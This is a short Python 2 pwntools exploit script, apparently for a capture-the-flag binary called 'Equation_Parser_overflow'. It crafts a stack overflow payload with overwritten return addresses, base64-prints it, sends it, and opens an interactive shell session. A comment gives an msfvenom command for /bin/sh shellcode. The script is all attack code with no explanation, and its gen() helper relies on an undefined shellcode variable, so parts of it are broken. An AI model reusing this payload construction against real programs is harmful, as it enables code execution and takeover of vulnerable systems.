#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-23 20:25:39
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 1
target = "./Equation_Parser_overflow"
remote_ip = ""
port = 0
rop = roputils.ROP(target)
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target)
	gdb.attach(p,"b*0x080495FA\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

def gen(eip):
	ru("\n")
	# shellcode = p32(0x41424344)
	payload = "1"*(0xa+0x4)+eip
	payload +="1"*(0x100-len(payload))
	payload += shellcode
	sd(payload)
	import base64
	print base64.b64encode(payload)
payload = p32(0x41424344)+"a"*(0x112-0x14)+p32(0)+p32(0)+p32(0)+"a"*0xc+p32(0x78777675)+p32(0x080eb060)
import base64
print base64.b64encode(payload)
sd(payload)
p.interactive()

